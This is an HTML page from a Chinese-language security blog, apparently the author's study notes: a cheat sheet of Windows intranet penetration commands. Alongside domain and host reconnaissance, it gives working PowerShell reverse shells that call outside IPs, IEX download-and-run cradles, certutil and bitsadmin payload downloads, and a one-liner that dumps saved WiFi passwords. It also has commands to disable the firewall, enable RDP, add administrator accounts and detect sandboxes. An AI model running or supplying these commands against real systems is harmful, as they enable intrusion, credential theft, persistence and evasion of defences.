@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>windows内网渗透常用命令总汇 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "windows\u5185\u7f51\u6e17\u900f\u5e38\u7528\u547d\u4ee4\u603b\u6c47", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u6b63\u6587", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-link">
+        利用acl进行横向
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" class="btn btn-xs btn-link">
+        Windows名称解析与相应攻击方法
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="windows">windows内网渗透常用命令总汇</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#正文">正文</a><ul>
+<li><a href="#查询网络配置信息">查询网络配置信息</a></li>
+<li><a href="#查询本机的服务信息">查询本机的服务信息</a></li>
+<li><a href="#查询系统信息">查询系统信息</a></li>
+<li><a href="#连接过的WIFI及密码">连接过的WIFI及密码</a></li>
+<li><a href="#查询进程列表">查询进程列表</a></li>
+<li><a href="#查看计划任务">查看计划任务</a></li>
+<li><a href="#查看主机开机时间">查看主机开机时间</a></li>
+<li><a href="#用户相关">用户相关</a></li>
+<li><a href="#查看端口列表">查看端口列表</a></li>
+<li><a href="#查看已打补丁">查看已打补丁</a></li>
+<li><a href="#查看共享列表">查看共享列表</a></li>
+<li><a href="#路由表和arp高速缓存表">路由表和arp高速缓存表</a></li>
+<li><a href="#防火墙">防火墙</a></li>
+<li><a href="#权限查看">权限查看</a></li>
+<li><a href="#判断是否存在域">判断是否存在域</a></li>
+<li><a href="#查看域的名字">查看域的名字</a></li>
+<li><a href="#探测域内存活主机">探测域内存活主机</a></li>
+<li><a href="#扫描域内开放端口">扫描域内开放端口</a></li>
+<li><a href="#域内基本信息">域内基本信息</a></li>
+<li><a href="#域用户信息收集">域用户信息收集</a></li>
+<li><a href="#本机wmic查杀软">本机wmic查杀软</a></li>
+<li><a href="#开3389">开3389</a></li>
+<li><a href="#用户增删改查">用户增删改查</a></li>
+<li><a href="#一些喜欢用的">一些喜欢用的</a></li>
+<li><a href="#ps-cs-上线">ps cs 上线</a></li>
+<li><a href="#查看开机自启">查看开机自启</a></li>
+<li><a href="#获取遥测任务">获取遥测任务</a></li>
+<li><a href="#反病毒检测">反病毒检测</a></li>
+<li><a href="#简单的沙盒虚拟机检测">简单的沙盒&amp;虚拟机检测</a></li>
+</ul>
+</li>
+</ul>
+<hr />
+<h2 id="_2">正文</h2>
+<p>前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学</p>
+<h3 id="_3">查询网络配置信息</h3>
+<p>ipconfig /all</p>
+<h3 id="_4">查询本机的服务信息</h3>
+<p>wmic service list brief</p>
+<p><img alt="image-20210217010533168" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010533168.png" title="image-20210217010533168" /></p>
+<h3 id="_5">查询系统信息</h3>
+<p>systeminfo</p>
+<p><img alt="image-20210217010547050" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010547050.png" title="image-20210217010547050" /></p>
+<h3 id="wifi">连接过的WIFI及密码</h3>
+<ol>
+<li>for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</li>
+</ol>
+<h3 id="_6">查询进程列表</h3>
+<p>tasklist / wmic process list brief</p>
+<p><img alt="image-20210217010556587" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010556587.png" title="image-20210217010556587" /></p>
+<h3 id="_7">查看计划任务</h3>
+<p>schtasks /query /fo LIST /v 列出计划任务详细信息</p>
+<h3 id="_8">查看主机开机时间</h3>
+<p>net statistics workstation</p>
+<p><img alt="image-20210217010605609" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010605609.png" title="image-20210217010605609" /></p>
+<h3 id="_9">用户相关</h3>
+<p>net user 查看所有用户
+net localgroup administrators 获取本地管理员信息</p>
+<h3 id="_10">查看端口列表</h3>
+<p>netstat -ano</p>
+<h3 id="_11">查看已打补丁</h3>
+<p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p>
+<h3 id="_12">查看共享列表</h3>
+<p>net share 查看本机共享列表和可访问的域共享列表
+wmic share get name,path,status 查找共享列表</p>
+<p><img alt="img" src="http://www.const27.com/wp-content/uploads/2020/08/image-7.png" title="img" /></p>
+<h3 id="arp">路由表和arp高速缓存表</h3>
+<p>route print 路由表
+arp -a arp高速缓存表</p>
+<h3 id="_13">防火墙</h3>
+<p>netsh firewall set opmode disable 关闭防火墙(Windows Server 2003 以前的版本)</p>
+<p>netsh advfirewall set allprofiles state off 关闭防火墙(Windows Server 2003 以后的版本)</p>
+<p>netsh firewall show config 查看防火墙配置
+如果上面的命令被弃用，则使用
+netsh advfirewall firewall show rule name=all</p>
+<p>根据参考，可以使用这个wmic一键获取本机信息<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" title="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
+<h3 id="_14">权限查看</h3>
+<p>whoami /all 查看自己的详细权限
+net user xxx /domain 查看域内指定用户的权限</p>
+<h3 id="_15">判断是否存在域</h3>
+<p>.net time /domain 若出现以下情况则不存在域</p>
+<p><img alt="image-20210217010613612" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010613612.png" title="image-20210217010613612" /></p>
+<p>若是报错：发生系统错误5，则存在域，但该用户不是域用户</p>
+<p>若是以下情况则说明存在域且已经在域中</p>
+<p><img alt="image-20210217010619330" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010619330.png" title="image-20210217010619330" /></p>
+<h3 id="_16">查看域的名字</h3>
+<p>net config workstation</p>
+<p><img alt="image-20210217010626107" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010626107.png" title="image-20210217010626107" /></p>
+<p>nslookup -type=srv <em>ldap.</em> tcp</p>
+<p><img alt="image-20210217010633461" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010633461.png" title="image-20210217010633461" /></p>
+<p>这个很爽，域控主机名和IP一块弄出来了</p>
+<h3 id="_17">探测域内存活主机</h3>
+<p>1.使用工具 nbtscan <a href="http://www.unixwiz.net/tools/nbtscan.html" title="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p>
+<p>2.查看arp高速缓存表</p>
+<p>arp -a</p>
+<p><img alt="img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/0X@7L2W0IVA`NKX1AM9JZKB.png" title="img" /></p>
+<p>3.ICMP协议探测（逐个ping）</p>
+<p>这个贼慢，但是不用下载其他应用</p>
+<pre><code class="language-纯文本">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;
+</code></pre>
+<p>4.nmap直接开扫</p>
+<p>5.meterpreter会话中执行 run windows/gather/enum_ad_computers</p>
+<h3 id="_18">扫描域内开放端口</h3>
+<p>1.nmap</p>
+<p>nmap 192.168.1.0/24</p>
+<p>2.工具 S扫描器</p>
+<p>3.自写脚本</p>
+<pre><code class="language-纯文本">#python3 慢的一批
+import socket
+
+def get_ip_status(ip,port):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        server.connect((ip,port))
+        print('{0} port {1} is open'.format(ip, port))
+    except Exception as err:
+        print('{0} port {1} is not open'.format(ip,port))
+    finally:
+        server.close()
+
+if __name__ == '__main__':
+    host = '172.16.0.198'
+    for port in range(20,100):
+        get_ip_status(host,port)
+</code></pre>
+<h3 id="_19">域内基本信息</h3>
+<p>net group “domain computers” /domain 查询所有域成员计算机列表
+net view /domain:HACHE 查询域内所有主机
+net accounts /domain 获取域密码信息
+nltest /domain_trusts 获取域信任信息
+nltest /DCLIST:hacke 查看域控制器机器名
+Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名</p>
+<h3 id="_20">域用户信息收集</h3>
+<p>net user /domain 向域控制器查询域内用户列表
+wmic useraccount get /all 获取域内用户详细信息
+net localgroup administrators 查询本地管理员用户
+net group “domain admins” /domain 查询域管理员用户
+net group “Enterprise admins” /domain 查询管理员用户组</p>
+<h3 id="wmic">本机wmic查杀软</h3>
+<p><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code>
+or</p>
+<p>WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</p>
+<h3 id="3389">开3389</h3>
+<p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
+<h3 id="_21">用户增删改查</h3>
+<p>net user username password /add 加用户</p>
+<p>net localgroup administrators username /add 添加XX到管理员账户</p>
+<h3 id="_22">一些喜欢用的</h3>
+<p>Windows 反弹shell</p>
+<pre><code class="language-纯文本">powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd
+
+powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666
+
+NISHANG里面抠的
+（乞丐版）
+$sm=(New-Object Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)} 
+（豪华版）
+$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+(cmd专版)
+rundll32.exe javascript:&quot;&quot;\..\mshtml,RunHTMLApplication &quot;&quot;;document.write();r=new%20ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).run(&quot;&quot;powershell -w h -ep bypass `$sm=(New-Object Net.Sockets.TCPClient('$IPAddress',$Port)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2&gt;&amp;1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '&gt; ';`$sb=([text.encoding]::UTF8).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}&quot;&quot;,0,true);
+</code></pre>
+<p>wmic 查杀软</p>
+<pre><code class="language-纯文本">WMIC /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe
+
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+</code></pre>
+<p>开3389</p>
+<pre><code class="language-纯文本">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+
+wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 0
+</code></pre>
+<p>常见杀软进程名
+<a href="https://blog.csdn.net/weixin_39997829/article/details/92666552" title="https://blog.csdn.net/weixin_39997829/article/details/92666552">https://blog.csdn.net/weixin_39997829/article/details/92666552</a></p>
+<p>cmd下载</p>
+<pre><code class="language-纯文本">bitsadmin /transfer n http://www.xx.com/code.jpg c:\users\sdyp\desktop\ff.jpg
+
+C:\Temp&gt;certutil.exe -urlcache -split -f &quot;https://hackers.home/badcontent.txt&quot; bad.txt
+C:\Temp&gt;certutil.exe -decode bad.txt bad.exe
+</code></pre>
+<p>获取盘符</p>
+<pre><code class="language-纯文本">wmic logicaldisk where drivetype=3 get deviceid
+</code></pre>
+<h3 id="ps-cs">ps cs 上线</h3>
+<pre><code class="language-纯文本">powershell.exe -c IEX((new-object net.webclient).downloadstring('http://xxx/a.ps1'))
+
+powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex&quot;
+
+powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)
+</code></pre>
+<h3 id="_23">查看开机自启</h3>
+<p>Reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
+<p>Reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p>
+<h3 id="_24">获取遥测任务</h3>
+<p>Reg query <strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser</strong></p>
+<h3 id="_25">反病毒检测</h3>
+<pre><code class="language-纯文本">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
+</code></pre>
+<p>根据系统的不同，反病毒软件通常会WMI中注册为<code>AntiVirusProduct</code>，保存在<code>root\SecurityCenter</code>或<code>root\SecurityCenter2</code>命名空间中。</p>
+<h3 id="_26">简单的沙盒&amp;虚拟机检测</h3>
+<p>沙盒往往是单核且内存小于2g，可以以此为凭据检测</p>
+<pre><code class="language-纯文本">Get-WmiObject -Class Win32_ComputerSystem NumberOfLogicalProcessors,TotalPhysicalMemory
+</code></pre>
+<p><img alt="image-20210802132941979" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210802132941979.png" title="image-20210802132941979" /></p>
+<p>VMWARE虚拟机如今用的比较多，我们可以通过检测进程中是否存在vmtoolsd以及BIOS属性里是否有VMWARE字样来判断是否是VMWARE虚拟机</p>
+<pre><code class="language-纯文本">Get-WmiObject Win32_BIOS -Filter 'SerialNumber Like &quot;%VMware%&quot;'
+Get-WmiObject Win32_NetworkAdapter -Filter 'Manufacturer LIKE &quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;'
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/" class="btn btn-xs btn-link">
+        利用acl进行横向
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/Windows%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%9B%B8%E5%BA%94%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" class="btn btn-xs btn-link">
+        Windows名称解析与相应攻击方法
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
